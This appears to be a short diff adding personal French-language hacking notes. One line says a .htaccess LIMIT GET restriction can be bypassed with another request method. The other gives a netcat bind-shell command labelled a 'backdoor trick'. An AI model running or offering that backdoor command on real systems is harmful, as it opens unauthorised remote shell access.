@@ -1,0 +1,4 @@
+.htaccess => LIMIT GET => Utiliser une autre requette (TROLL http:// ...)
+
+nc -l -p 4444 -e /bin/bash => Netcat backdoor trick
+
